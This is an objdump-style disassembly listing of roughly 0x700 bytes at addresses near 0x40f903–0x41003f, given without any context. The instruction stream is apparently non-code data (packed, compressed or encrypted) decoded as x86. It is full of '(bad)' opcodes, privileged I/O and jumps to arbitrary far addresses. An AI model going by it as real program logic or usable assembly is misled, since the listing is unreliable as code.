  40f903:	test   eax,0x5ab98234
  40f908:	xor    bl,BYTE PTR [edi+0x7a]
  40f90b:	out    0xf4,al
  40f90d:	mov    ecx,0x7ea2ae4
  40f912:	dec    esp
  40f913:	stos   DWORD PTR es:[edi],eax
  40f914:	clc    
  40f915:	(bad)  
  40f916:	into   
  40f917:	loop   0x40f8e1
  40f919:	cmp    al,0x4c
  40f91b:	mov    eax,0x570ab635
  40f920:	je     0x40f98f
  40f922:	inc    edx
  40f923:	jg     0x40f95f
  40f925:	and    BYTE PTR [ecx],0xe0
  40f928:	sub    bl,dh
  40f92a:	lods   al,BYTE PTR ds:[esi]
  40f92b:	push   cs
  40f92c:	mov    al,ds:0x3beb05f8
  40f931:	nop    WORD PTR [ebx+0x7bc31ae8]
  40f939:	inc    edi
  40f93a:	jne    0x40f96e
  40f93c:	aad    0xc1
  40f93e:	int3   
  40f93f:	test   al,0x85
  40f941:	push   ecx
  40f942:	outs   dx,BYTE PTR ds:[esi]
  40f943:	xchg   esp,eax
  40f944:	jo     0x40f951
  40f946:	rcl    edx,0xb4
  40f949:	cld    
  40f94a:	sbb    BYTE PTR [ecx],ch
  40f94c:	dec    ebx
  40f94d:	pop    eax
  40f94e:	mov    eax,0x3857c701
  40f953:	in     al,0x4b
  40f955:	fdivr  DWORD PTR [esi-0x354ba548]
  40f95b:	sbb    BYTE PTR [ebx],dl
  40f95d:	or     cl,0xa2
  40f960:	and    edi,DWORD PTR [esi+0x36]
  40f963:	scas   al,BYTE PTR es:[edi]
  40f964:	popa   
  40f965:	add    ebp,esi
  40f967:	call   0xc3b:0x1dab4cbc
  40f96e:	loop   0x40f9eb
  40f970:	pop    edi
  40f971:	jns    0x40f925
  40f973:	call   0xe11d:0xeafd7b7d
  40f97a:	lods   al,BYTE PTR ds:[esi]
  40f97b:	les    ebp,FWORD PTR ds:0x578458fc
  40f981:	dec    edx
  40f982:	push   ds
  40f983:	mov    cl,0x5f
  40f985:	cmc    
  40f986:	or     esp,DWORD PTR [eax+esi*1+0x3]
  40f98a:	xchg   esp,eax
  40f98b:	xor    dh,cl
  40f98d:	jne    0x40f9de
  40f98f:	xor    DWORD PTR ds:0xb66324bd,esp
  40f995:	sbb    BYTE PTR [ebp+0x6],al
  40f998:	stc    
  40f999:	les    ebx,FWORD PTR [ecx-0x6d073b0f]
  40f99f:	fwait
  40f9a0:	jle    0x40f978
  40f9a2:	in     eax,dx
  40f9a3:	add    eax,0x3fb1ff67
  40f9a8:	add    al,0x14
  40f9aa:	ins    BYTE PTR es:[edi],dx
  40f9ab:	scas   al,BYTE PTR es:[edi]
  40f9ac:	ja     0x40f9b6
  40f9ae:	add    ch,BYTE PTR ds:0x7893aea9
  40f9b4:	mov    eax,0x9317ffc4
  40f9b9:	loopne 0x40fa13
  40f9bb:	iret   
  40f9bc:	sub    ah,bh
  40f9be:	add    BYTE PTR [eax],ch
  40f9c0:	in     al,0x62
  40f9c2:	sub    dh,BYTE PTR [eax]
  40f9c4:	std    
  40f9c5:	div    bh
  40f9c7:	aas    
  40f9c8:	addr16 dec esi
  40f9ca:	nop
  40f9cb:	xor    BYTE PTR [eax],bl
  40f9cd:	or     DWORD PTR [ebp+ebp*2-0x8],eax
  40f9d1:	or     DWORD PTR [ecx-0x6b],ebp
  40f9d4:	pushf  
  40f9d5:	push   ds
  40f9d6:	repz adc ah,BYTE PTR [edx]
  40f9d9:	push   eax
  40f9da:	out    0x64,eax
  40f9dc:	mov    ebp,0xd767c48c
  40f9e1:	test   esi,eax
  40f9e3:	cdq    
  40f9e4:	ror    edi,1
  40f9e6:	sub    eax,0xce255f00
  40f9eb:	(bad)  [ecx+0x46]
  40f9ee:	cwde   
  40f9ef:	cs inc esp
  40f9f1:	xchg   ebp,eax
  40f9f2:	out    0xd1,eax
  40f9f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9f5:	jne    0x40f9e6
  40f9f7:	mov    esp,0xb40d6df
  40f9fc:	in     al,0x3c
  40f9fe:	xor    al,0x2f
  40fa00:	ins    DWORD PTR es:[edi],dx
  40fa01:	in     eax,0xec
  40fa03:	mov    eax,ds:0x1dd92f63
  40fa08:	bound  edi,QWORD PTR [edx+0x1af5e47e]
  40fa0e:	fist   WORD PTR [ebx-0x10d815ac]
  40fa14:	hlt    
  40fa15:	iret   
  40fa16:	mov    esp,0x97a67a49
  40fa1b:	push   cs
  40fa1c:	je     0x40fa1b
  40fa1e:	add    DWORD PTR [edi],esp
  40fa20:	jl     0x40f9a8
  40fa22:	test   DWORD PTR [ebx+0x71],esi
  40fa25:	adc    esp,esp
  40fa27:	and    ebx,DWORD PTR [esi]
  40fa29:	adc    DWORD PTR [esi-0x6738e3ff],0x4ed7ac36
  40fa33:	push   edx
  40fa34:	(bad)  
  40fa36:	and    eax,0xb438bce8
  40fa3b:	fwait
  40fa3c:	or     edi,0xffffffa2
  40fa3f:	js     0x40f9cb
  40fa41:	adc    DWORD PTR [ebp+0x5e],eax
  40fa44:	sub    eax,0x3c94c6e5
  40fa49:	cld    
  40fa4a:	fnsetpm(287 only) 
  40fa4c:	mov    DWORD PTR [ebx-0x4f077749],ecx
  40fa52:	inc    ecx
  40fa53:	les    ebp,FWORD PTR [ebx+0x30]
  40fa56:	sub    bh,bh
  40fa58:	mov    dh,0x72
  40fa5a:	xchg   ecx,eax
  40fa5b:	cld    
  40fa5c:	push   es
  40fa5d:	(bad)  
  40fa5e:	or     DWORD PTR [edx-0x4b],edi
  40fa61:	fs fsubp st(1),st
  40fa64:	pop    edi
  40fa65:	out    0x90,eax
  40fa67:	nop
  40fa68:	gs inc ebx
  40fa6a:	imul   eax,DWORD PTR [ebp+0x4c],0x15ba9ef6
  40fa71:	pop    ecx
  40fa72:	cdq    
  40fa73:	fcom   DWORD PTR [edi-0x10]
  40fa76:	aaa    
  40fa77:	fcom   st(6)
  40fa79:	rcr    BYTE PTR [esi+0x6],1
  40fa7c:	jae    0x40fa76
  40fa7e:	and    DWORD PTR [ebx*1+0x3016a71d],ebp
  40fa85:	mov    ds:0xfe47f08d,eax
  40fa8a:	sub    ch,0x22
  40fa8d:	sub    al,0x7
  40fa8f:	dec    ebp
  40fa90:	xchg   BYTE PTR [edx+0x6c0979b3],dl
  40fa96:	xor    BYTE PTR [ecx*8-0x2cbf40eb],ch
  40fa9d:	clc    
  40fa9e:	je     0x40fab8
  40faa0:	jmp    0x5eac:0x9d6c0895
  40faa7:	xor    dl,BYTE PTR [eax-0x1e]
  40faaa:	gs out 0x59,eax
  40faad:	fisttp DWORD PTR [edx]
  40faaf:	fdiv   DWORD PTR [esi+0x17]
  40fab2:	out    dx,eax
  40fab3:	shl    BYTE PTR [ecx+0x4d],cl
  40fab6:	sbb    ch,BYTE PTR [edx+edi*2]
  40fab9:	cli    
  40faba:	push   0xffffffc1
  40fabc:	or     al,0xb6
  40fabe:	dec    ecx
  40fabf:	popf   
  40fac0:	shr    BYTE PTR [edi+0x259fd5e1],1
  40fac6:	pop    ds
  40fac7:	mov    DWORD PTR ds:0xa2b3d546,esp
  40facd:	ret    
  40face:	repz cmp DWORD PTR [edi+0x2a],eax
  40fad2:	cmp    al,0xe0
  40fad4:	in     al,dx
  40fad5:	popf   
  40fad6:	xchg   ecx,eax
  40fad7:	retf   0xeeeb
  40fada:	cdq    
  40fadb:	adc    bl,BYTE PTR ds:0xff3cf9e0
  40fae1:	in     al,dx
  40fae2:	jge    0x40fac4
  40fae4:	mov    eax,ds
  40fae6:	jno    0x40fb08
  40fae8:	in     eax,0xeb
  40faea:	and    BYTE PTR [edx-0x6b47f194],ah
  40faf0:	sub    dh,bh
  40faf2:	cdq    
  40faf3:	xor    al,0x9f
  40faf5:	outs   dx,DWORD PTR ds:[esi]
  40faf6:	sub    edx,esp
  40faf8:	push   edi
  40faf9:	mov    ebp,0x44fe26c6
  40fafe:	mov    ecx,0xfbe2623b
  40fb03:	push   es
  40fb04:	fdivrp st(6),st
  40fb06:	hlt    
  40fb07:	popf   
  40fb08:	mov    bl,0x0
  40fb0a:	inc    ecx
  40fb0b:	sub    al,0x18
  40fb0d:	int    0xe1
  40fb0f:	(bad)  
  40fb10:	sbb    dl,dh
  40fb12:	mov    ecx,0x1b1779c6
  40fb17:	je     0x40faa1
  40fb19:	cld    
  40fb1a:	push   ecx
  40fb1b:	mov    dh,0x7b
  40fb1d:	daa    
  40fb1e:	or     al,0x8a
  40fb20:	add    eax,0x8967ccad
  40fb25:	pop    esi
  40fb26:	push   eax
  40fb27:	cmp    al,0x24
  40fb29:	mov    cl,0x3
  40fb2b:	pop    ebx
  40fb2c:	stc    
  40fb2d:	add    DWORD PTR [ebx+0x28053a8c],edx
  40fb33:	jl     0x40fb9c
  40fb35:	test   DWORD PTR [esi+0x64],ecx
  40fb38:	xchg   ebx,eax
  40fb39:	int    0x4f
  40fb3b:	bnd jmp 0x1901fc3c
  40fb41:	jge    0x40fba7
  40fb43:	xchg   esi,eax
  40fb44:	sahf   
  40fb45:	push   ds
  40fb46:	aam    0xbd
  40fb48:	xchg   ecx,eax
  40fb49:	dec    edi
  40fb4a:	jne    0x40fbbb
  40fb4c:	ret    
  40fb4d:	mov    ecx,0x6152018f
  40fb52:	outs   dx,BYTE PTR ds:[esi]
  40fb53:	stos   DWORD PTR es:[edi],eax
  40fb54:	(bad)
  40fb58:	xchg   ebp,eax
  40fb59:	lea    ebx,[edi+0x5977fafe]
  40fb5f:	cwde   
  40fb60:	mov    bh,0xf2
  40fb62:	inc    esi
  40fb63:	push   esp
  40fb64:	mov    WORD PTR [ebx+0x776bb432],fs
  40fb6a:	int3   
  40fb6b:	(bad)  
  40fb6c:	in     eax,dx
  40fb6d:	pushf  
  40fb6e:	adc    BYTE PTR [ebp+0x483c1743],al
  40fb74:	icebp  
  40fb75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb76:	cli    
  40fb77:	loope  0x40fbee
  40fb79:	scas   al,BYTE PTR es:[edi]
  40fb7a:	aas    
  40fb7b:	xchg   edx,eax
  40fb7c:	jg     0x40fbf6
  40fb7e:	pop    DWORD PTR [ebx-0x14]
  40fb81:	fs mov al,0xf8
  40fb84:	in     al,dx
  40fb85:	sub    dl,dh
  40fb87:	or     DWORD PTR [ebp+0x4a62aacf],ecx
  40fb8d:	cmc    
  40fb8e:	mov    edx,0x3951c2db
  40fb93:	sub    ah,BYTE PTR [edi]
  40fb95:	jmp    0xc5a9a159
  40fb9a:	int    0xc2
  40fb9c:	adc    DWORD PTR [ecx+0x77],esi
  40fb9f:	and    eax,0xaf3baf85
  40fba4:	ds dec edi
  40fba6:	cmc    
  40fba7:	adc    eax,0xa804b32d
  40fbac:	xchg   edi,eax
  40fbad:	add    ebp,DWORD PTR [edx+ecx*1+0x28600b45]
  40fbb4:	sbb    edi,ebp
  40fbb6:	xchg   esi,eax
  40fbb7:	scas   al,BYTE PTR es:[edi]
  40fbb8:	cmc    
  40fbb9:	sbb    edi,ebp
  40fbbb:	fnstenv [ebx+0x32965c5c]
  40fbc1:	adc    al,0x7d
  40fbc3:	add    BYTE PTR [eax-0x1574ed5],dl
  40fbc9:	adc    edx,DWORD PTR [edi+0x62]
  40fbcc:	test   BYTE PTR ds:0xfb71962f,cl
  40fbd2:	push   0xffffffa9
  40fbd4:	fdivr  DWORD PTR [edi]
  40fbd6:	inc    esp
  40fbd7:	sbb    edi,DWORD PTR [eax+0x14]
  40fbda:	xchg   edi,eax
  40fbdb:	dec    edx
  40fbdc:	inc    edi
  40fbdd:	(bad)  
  40fbde:	shl    BYTE PTR [ecx+0x246e00c],cl
  40fbe4:	cwde   
  40fbe5:	mov    esp,0x68db1f7
  40fbea:	or     BYTE PTR [ecx],ah
  40fbec:	sub    DWORD PTR [ebp-0x385fe11c],edi
  40fbf2:	sub    al,0xd1
  40fbf4:	inc    esi
  40fbf5:	inc    ecx
  40fbf6:	out    0x9c,al
  40fbf8:	pop    es
  40fbf9:	(bad)  
  40fbfa:	retf   
  40fbfb:	cwde   
  40fbfc:	fld    QWORD PTR [ebx+ebx*2+0x1c496190]
  40fc03:	xlat   BYTE PTR es:[ebx]
  40fc05:	sbb    DWORD PTR [bx+si],esi
  40fc08:	add    BYTE PTR [ebx],cl
  40fc0a:	cmp    al,0x1a
  40fc0c:	pusha  
  40fc0d:	mov    esi,DWORD PTR [edi+0x19488495]
  40fc13:	loopne 0x40fc14
  40fc15:	mov    ss,WORD PTR [ebx]
  40fc17:	mov    edi,0x72c0e491
  40fc1c:	stos   DWORD PTR es:[edi],eax
  40fc1d:	sti    
  40fc1e:	and    eax,0x73442272
  40fc23:	xchg   DWORD PTR [edx],ebp
  40fc25:	clc    
  40fc26:	push   eax
  40fc27:	inc    esi
  40fc28:	jecxz  0x40fc8a
  40fc2a:	out    0xce,eax
  40fc2c:	jae    0x40fc96
  40fc2e:	xchg   edx,eax
  40fc2f:	int3   
  40fc30:	mov    dh,0x40
  40fc32:	shl    DWORD PTR [bp+0x4181],cl
  40fc37:	sub    BYTE PTR [eax+ecx*1],0x3a
  40fc3b:	dec    edx
  40fc3c:	lahf   
  40fc3d:	dec    edi
  40fc3e:	add    ebp,DWORD PTR [esi-0x17332984]
  40fc44:	sbb    dl,BYTE PTR [eiz*4+0x23b4d046]
  40fc4b:	fiadd  DWORD PTR [eax]
  40fc4d:	xor    al,BYTE PTR [ebx-0x26]
  40fc50:	std    
  40fc51:	xor    bh,0xa3
  40fc54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc55:	inc    ecx
  40fc56:	push   edi
  40fc57:	mov    ebx,0x66ccc77
  40fc5c:	ret    0xd564
  40fc5f:	pop    ecx
  40fc60:	repnz pop ebx
  40fc62:	sub    esi,edx
  40fc64:	(bad)
  40fc67:	push   0xfffffffb
  40fc69:	push   0xffffffae
  40fc6b:	or     ecx,edx
  40fc6d:	jg     0x40fc27
  40fc6f:	mov    cs,WORD PTR [eax-0x7f]
  40fc72:	cwde   
  40fc73:	jp     0x40fc11
  40fc75:	ins    BYTE PTR es:[edi],dx
  40fc76:	cli    
  40fc77:	or     eax,0x4f49a213
  40fc7c:	cmp    BYTE PTR [edi+0x52],0x44
  40fc80:	test   al,0x8f
  40fc82:	stc    
  40fc83:	repz mov bl,BYTE PTR [esi+0x4373afe3]
  40fc8a:	int3   
  40fc8b:	pop    ebx
  40fc8c:	adc    bl,ah
  40fc8e:	stos   DWORD PTR es:[edi],eax
  40fc8f:	imul   ecx,DWORD PTR [edx],0x83d34676
  40fc95:	mov    ah,0xe9
  40fc97:	inc    ebp
  40fc98:	adc    BYTE PTR [ebx-0x24],0x4e
  40fc9c:	in     al,0xc3
  40fc9e:	lock or al,0xf7
  40fca1:	in     eax,dx
  40fca2:	mov    esi,0x9a77550e
  40fca7:	mov    edx,0xa80d772d
  40fcac:	pusha  
  40fcad:	popa   
  40fcae:	sub    eax,0xdb0ba4e9
  40fcb3:	and    eax,0xf982b7c
  40fcb8:	mov    dl,0xd7
  40fcba:	inc    ecx
  40fcbb:	(bad)  
  40fcbc:	jmp    0x40fcdd
  40fcbe:	popf   
  40fcbf:	lods   eax,DWORD PTR ds:[esi]
  40fcc0:	mov    WORD PTR [ebx],es
  40fcc2:	iret   
  40fcc3:	jno    0x40fcac
  40fcc5:	lea    eax,[ebp+0x4a]
  40fcc8:	in     eax,dx
  40fcc9:	out    0xde,eax
  40fccb:	call   0xc340:0x9b4b200a
  40fcd2:	jle    0x40fc89
  40fcd4:	and    ebx,edi
  40fcd6:	adc    ch,cl
  40fcd8:	aaa    
  40fcd9:	fidivr WORD PTR [edi+ecx*2]
  40fcdc:	retf   0x6a72
  40fcdf:	fbld   TBYTE PTR [ebx]
  40fce1:	push   esi
  40fce2:	adc    DWORD PTR [ebp+eiz*1+0x566ea1a2],ebp
  40fce9:	xor    edx,DWORD PTR [eax-0x76]
  40fcec:	xchg   esi,eax
  40fced:	pop    edx
  40fcee:	stos   DWORD PTR es:[edi],eax
  40fcef:	inc    esp
  40fcf0:	jb     0x40fd0d
  40fcf2:	jnp    0x40fcf0
  40fcf4:	jecxz  0x40fd20
  40fcf6:	sub    DWORD PTR [ecx+0x46],ebp
  40fcf9:	test   DWORD PTR [esi],eax
  40fcfb:	add    eax,0x7b27471e
  40fd00:	mov    bh,0x4a
  40fd02:	(bad)
  40fd05:	xchg   esp,eax
  40fd06:	ret    
  40fd07:	cmp    esp,DWORD PTR [ebp-0x36695201]
  40fd0d:	cmp    BYTE PTR [edi],0x5e
  40fd10:	in     al,0xad
  40fd12:	hlt    
  40fd13:	xchg   edi,eax
  40fd14:	(bad)  
  40fd16:	dec    eax
  40fd17:	sub    al,0xfc
  40fd19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd1a:	repz push edx
  40fd1c:	xor    eax,0x51598557
  40fd21:	jne    0x40fd4e
  40fd23:	xchg   DWORD PTR [edi+0x2e387ce6],ebp
  40fd29:	push   esp
  40fd2a:	xchg   BYTE PTR [ebp-0x1bf6a68a],dh
  40fd30:	or     eax,0xf52f5731
  40fd35:	dec    esp
  40fd36:	call   0x17a9:0xcd737773
  40fd3d:	test   ah,cl
  40fd3f:	stos   DWORD PTR es:[edi],eax
  40fd40:	aad    0x80
  40fd42:	mov    esi,0x4cce4b11
  40fd47:	xlat   BYTE PTR ds:[ebx]
  40fd48:	push   cs
  40fd49:	push   ds
  40fd4a:	push   ss
  40fd4b:	lods   eax,DWORD PTR ds:[esi]
  40fd4c:	cld    
  40fd4d:	fistp  DWORD PTR [esi-0x732eeb9]
  40fd53:	test   BYTE PTR [ebp-0x80],dh
  40fd56:	(bad)  
  40fd57:	lea    ebp,[eax]
  40fd59:	pop    ds
  40fd5a:	arpl   WORD PTR [esi],sp
  40fd5c:	enter  0x3bd1,0xe9
  40fd60:	xor    al,0x77
  40fd62:	cmc    
  40fd63:	add    eax,0xc732dc3d
  40fd68:	cmp    ebx,DWORD PTR [edx+ebx*4]
  40fd6b:	xchg   DWORD PTR [ecx],edx
  40fd6d:	jl     0x40fddf
  40fd6f:	cwde   
  40fd70:	gs mov ?,WORD PTR ds:[ecx+edi*8+0x2f596a6b]
  40fd79:	pop    esi
  40fd7a:	shr    DWORD PTR [eax+0x24],cl
  40fd7d:	xor    eax,0x34afb3cc
  40fd82:	cmp    esi,0xeb670607
  40fd88:	cwde   
  40fd89:	cmc    
  40fd8a:	outs   dx,BYTE PTR ds:[esi]
  40fd8b:	pop    es
  40fd8c:	(bad)  
  40fd8d:	mov    edx,0x98a34a20
  40fd92:	ds out 0x91,eax
  40fd95:	dec    eax
  40fd96:	test   eax,0x585fe952
  40fd9b:	out    0x23,eax
  40fd9d:	mov    dh,0xa7
  40fd9f:	(bad)  
  40fda0:	cld    
  40fda1:	test   al,0x6a
  40fda3:	test   BYTE PTR [ebp-0x80],ah
  40fda6:	loope  0x40fd85
  40fda8:	sbb    dl,BYTE PTR [eax*1-0x10f5f2c6]
  40fdaf:	test   al,0x91
  40fdb1:	mov    ecx,0x72b9f062
  40fdb6:	pop    esp
  40fdb7:	fs dec ebx
  40fdb9:	stc    
  40fdba:	sahf   
  40fdbb:	push   es
  40fdbc:	(bad)  
  40fdbd:	jge    0x40fd63
  40fdbf:	(bad)  
  40fdc0:	pop    eax
  40fdc1:	addr16 xchg ecx,eax
  40fdc3:	xor    eax,0xa6008aad
  40fdc8:	lds    esi,FWORD PTR [edx-0x66846cad]
  40fdce:	sbb    al,0x14
  40fdd0:	jns    0x40fe34
  40fdd2:	pop    ds
  40fdd3:	mov    eax,ds:0x81781d22
  40fdd8:	dec    esp
  40fdd9:	ins    DWORD PTR es:[edi],dx
  40fdda:	dec    ebp
  40fddb:	jmp    0x211c429a
  40fde0:	add    DWORD PTR [ebp+esi*2-0x1bfa17dd],ecx
  40fde7:	or     eax,0x53e16313
  40fdec:	data16 jg 0x40fdb2
  40fdef:	test   dh,bh
  40fdf1:	cmp    ebx,ecx
  40fdf3:	inc    ebx
  40fdf4:	mov    edi,0x5dff3478
  40fdf9:	das    
  40fdfa:	adc    ch,dh
  40fdfc:	adc    ch,BYTE PTR [edi]
  40fdfe:	cmp    ch,dh
  40fe00:	out    dx,eax
  40fe01:	jle    0x40fe29
  40fe03:	jne    0x40fe77
  40fe05:	neg    DWORD PTR [esi-0x6a]
  40fe08:	mov    bh,0x44
  40fe0a:	pop    esp
  40fe0b:	out    0x41,eax
  40fe0d:	xchg   BYTE PTR [ecx+0x64],dh
  40fe10:	sub    DWORD PTR [ebp-0x40b71a17],edi
  40fe16:	xchg   ebx,eax
  40fe17:	jb     0x40fddd
  40fe19:	pusha  
  40fe1a:	and    eax,0x9f16d13a
  40fe1f:	push   eax
  40fe20:	(bad)  
  40fe21:	pop    esi
  40fe22:	pusha  
  40fe23:	adc    eax,0x8106f2c6
  40fe28:	mov    edx,0xde2c233
  40fe2d:	mov    ecx,0x51a93e09
  40fe32:	jo     0x40fdc1
  40fe34:	sar    esp,0x28
  40fe37:	dec    eax
  40fe38:	inc    esi
  40fe39:	jmp    0x40fddf
  40fe3b:	pop    edi
  40fe3c:	cmp    ch,BYTE PTR [eax+edx*2+0x5f]
  40fe40:	gs (bad) 
  40fe42:	jle    0x40fea5
  40fe44:	mov    eax,ds:0xb43d4298
  40fe49:	int3   
  40fe4a:	cwde   
  40fe4b:	jns    0x40fdf6
  40fe4d:	mov    ebx,0x6f6c93ae
  40fe52:	lds    ebx,FWORD PTR [edx-0x2a]
  40fe55:	in     al,0xc8
  40fe57:	pop    esp
  40fe58:	xchg   ebp,eax
  40fe59:	jmp    0x40fe65
  40fe5b:	clc    
  40fe5c:	scas   eax,DWORD PTR es:[edi]
  40fe5d:	cs pop es
  40fe5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe60:	pushf  
  40fe61:	pop    ebx
  40fe62:	jmp    DWORD PTR [ebx-0x25]
  40fe65:	test   al,0x35
  40fe67:	adc    eax,0x8b08af1b
  40fe6c:	cmp    cl,dh
  40fe6e:	(bad)
  40fe71:	pop    ebp
  40fe72:	or     DWORD PTR [eax+0x60034325],ebp
  40fe78:	enter  0x889,0x3
  40fe7c:	adc    al,0x44
  40fe7e:	in     al,0x3
  40fe80:	shl    DWORD PTR [ecx-0xd],0x31
  40fe84:	ret    
  40fe85:	sub    eax,0x4512c4bf
  40fe8a:	shr    BYTE PTR [edi+0x4f2639a5],0xca
  40fe91:	push   cs
  40fe92:	adc    BYTE PTR [ebp-0x4936c36c],bh
  40fe98:	test   eax,0x36fbb023
  40fe9d:	push   esp
  40fe9e:	mov    bl,0x2c
  40fea0:	mov    bl,0x3
  40fea2:	dec    edi
  40fea3:	cld    
  40fea4:	test   BYTE PTR [ebp+0xd41148a],cl
  40feaa:	adc    eax,0x65d042d3
  40feaf:	xor    dl,cl
  40feb1:	adc    bh,BYTE PTR [ecx]
  40feb3:	pop    esp
  40feb4:	(bad)  
  40feb5:	sti    
  40feb6:	lods   al,BYTE PTR ds:[esi]
  40feb7:	ds retf 
  40feb9:	(bad)  
  40feba:	icebp  
  40febb:	jmp    0x40fe92
  40febd:	shl    BYTE PTR [edx],0x1
  40fec0:	outs   dx,BYTE PTR ds:[esi]
  40fec1:	jp     0x40fe76
  40fec3:	scas   al,BYTE PTR es:[edi]
  40fec4:	push   ecx
  40fec5:	mov    ebx,0x3650e346
  40feca:	jmp    0x197:0x21984931
  40fed1:	jp     0x40fef6
  40fed3:	cli    
  40fed4:	imul   ecx,DWORD PTR [edx+eiz*4],0x34
  40fed8:	jge    0x40feae
  40feda:	sahf   
  40fedb:	and    edi,DWORD PTR [ecx]
  40fedd:	xlat   BYTE PTR ds:[ebx]
  40fede:	xlat   BYTE PTR ds:[ebx]
  40fedf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fee0:	jb     0x40fe7e
  40fee2:	test   al,0x97
  40fee4:	mov    DWORD PTR [ebp+0x1c],ebx
  40fee7:	cdq    
  40fee8:	pop    es
  40fee9:	ret    
  40feea:	daa    
  40feeb:	cwde   
  40feec:	outs   dx,DWORD PTR ds:[esi]
  40feed:	pushf  
  40feee:	jb     0x40fe9a
  40fef0:	clc    
  40fef1:	iret   
  40fef2:	adc    cl,BYTE PTR [esi]
  40fef4:	mov    dl,0x63
  40fef6:	mov    es,WORD PTR [esi+0x2457d615]
  40fefc:	mov    ebp,0x8bc36258
  40ff01:	push   eax
  40ff02:	scas   eax,DWORD PTR es:[edi]
  40ff03:	pmullw mm3,QWORD PTR [edx-0x74]
  40ff07:	(bad)  
  40ff08:	repz loopne 0x40ff2b
  40ff0b:	adc    al,0x5f
  40ff0d:	out    dx,eax
  40ff0e:	ins    BYTE PTR es:[edi],dx
  40ff0f:	rsqrtps xmm2,XMMWORD PTR [edi+0x32]
  40ff13:	(bad)  ds:0x64404efd
  40ff19:	mov    bh,0x67
  40ff1b:	adc    al,0xa9
  40ff1d:	sbb    DWORD PTR [esi],ecx
  40ff1f:	psrld  mm2,mm7
  40ff22:	or     edx,DWORD PTR [edx-0x6]
  40ff25:	popa   
  40ff26:	add    eax,0x2640d5da
  40ff2b:	imul   eax,DWORD PTR [ebp-0x38],0xfd5db928
  40ff32:	jecxz  0x40ff7a
  40ff34:	cmp    BYTE PTR [esi],ch
  40ff36:	scas   al,BYTE PTR es:[edi]
  40ff37:	in     eax,0xd0
  40ff39:	dec    edi
  40ff3a:	in     eax,dx
  40ff3b:	daa    
  40ff3c:	mov    ds:0x8ac37a9e,eax
  40ff41:	call   FWORD PTR [ecx-0x64]
  40ff44:	inc    esi
  40ff45:	push   esp
  40ff46:	daa    
  40ff47:	add    esi,DWORD PTR [ebp+0x3793e4a5]
  40ff4d:	jo     0x40fedf
  40ff4f:	inc    edi
  40ff50:	jmp    0x40ff51
  40ff52:	mov    al,ds:0x398cd6b3
  40ff57:	dec    ebx
  40ff58:	inc    edi
  40ff59:	(bad)  
  40ff5a:	aad    0xdb
  40ff5c:	mov    cl,0xb4
  40ff5e:	xchg   ebx,eax
  40ff5f:	jbe    0x40ff63
  40ff61:	pop    ds
  40ff62:	and    eax,0x86c82ecd
  40ff67:	leave  
  40ff68:	pop    esi
  40ff69:	cmc    
  40ff6a:	xchg   ecx,eax
  40ff6b:	aam    0x80
  40ff6d:	ins    DWORD PTR es:[edi],dx
  40ff6e:	in     eax,0x2f
  40ff70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff71:	call   0xce53e71f
  40ff76:	scas   al,BYTE PTR es:[edi]
  40ff77:	jbe    0x40ffbc
  40ff79:	popf   
  40ff7a:	inc    ecx
  40ff7b:	cmp    DWORD PTR [ebp+0x285691c2],edx
  40ff81:	call   FWORD PTR [esi+ebp*1-0x3e]
  40ff85:	outs   dx,BYTE PTR ds:[esi]
  40ff86:	mov    al,ds:0x4f139ac2
  40ff8b:	sub    bh,BYTE PTR [eax+0x12]
  40ff8e:	pop    edx
  40ff8f:	dec    esp
  40ff90:	ins    DWORD PTR es:[edi],dx
  40ff91:	gs mov ch,0xfb
  40ff94:	fidivr DWORD PTR [eax]
  40ff96:	rcl    DWORD PTR [ebx],1
  40ff98:	xchg   ebx,eax
  40ff99:	sub    ecx,DWORD PTR [ebx]
  40ff9b:	and    BYTE PTR cs:[esp+ecx*1],ah
  40ff9f:	push   edx
  40ffa0:	sar    DWORD PTR [ebp-0x4a],0x87
  40ffa4:	push   es
  40ffa5:	and    BYTE PTR [ebx],bl
  40ffa7:	inc    ebx
  40ffa8:	into   
  40ffa9:	loope  0x40ffb7
  40ffab:	mov    BYTE PTR [esi+0x71739d99],0x61
  40ffb2:	mov    al,0xe9
  40ffb4:	out    dx,al
  40ffb5:	retf   0xd0ae
  40ffb8:	fwait
  40ffb9:	or     DWORD PTR [esi+ecx*4],ebx
  40ffbc:	rcl    BYTE PTR [eax-0x4f],cl
  40ffbf:	imul   ecx,DWORD PTR [ebx],0x27
  40ffc2:	retf   0x6fcc
  40ffc5:	in     eax,dx
  40ffc6:	leave  
  40ffc7:	jb     0x410009
  40ffc9:	sar    al,0x4f
  40ffcc:	cld    
  40ffcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffce:	fcomp  QWORD PTR [ecx-0x691559a3]
  40ffd4:	out    0x54,eax
  40ffd6:	adc    DWORD PTR [esi],0x10857d91
  40ffdc:	fdivr  st(3),st
  40ffde:	pushfw 
  40ffe0:	cmp    edx,DWORD PTR [ecx+edi*2]
  40ffe3:	data16 cmp al,BYTE PTR [ebx+0x3b585317]
  40ffea:	retf   0x3e04
  40ffed:	repnz in al,0x35
  40fff0:	test   DWORD PTR [esi],eax
  40fff2:	fldcw  WORD PTR [esi-0x2f63eeae]
  40fff8:	mov    ds:0x580d3e2e,al
  40fffd:	or     eax,0x6a8f3613
  410002:	scas   eax,DWORD PTR es:[edi]
  410003:	xor    eax,0xa81c9217
  410008:	sbb    edx,eax
  41000a:	rcl    DWORD PTR [esi-0x1706f295],cl
  410010:	jg     0x40ffe8
  410012:	ficom  DWORD PTR [eax]
  410014:	(bad)  
  410016:	rcr    ecx,cl
  410018:	add    BYTE PTR [edi],al
  41001a:	ins    BYTE PTR es:[edi],dx
  41001b:	cmp    al,0x1
  41001d:	dec    ebx
  41001e:	rol    dl,1
  410020:	xor    ebp,ebp
  410022:	jnp    0x40ffea
  410024:	push   esi
  410025:	jns    0x410033
  410027:	xor    ebx,DWORD PTR [edx]
  410029:	mov    ebx,0xce21a8c0
  41002e:	ins    BYTE PTR es:[edi],dx
  41002f:	jl     0x410097
  410031:	fnsave [esi]
  410033:	repnz mov dl,0x40
  410036:	ficomp WORD PTR [eax+eiz*4+0x4399505]
  41003d:	jmp    0x4100b6
  41003f:	pushf  
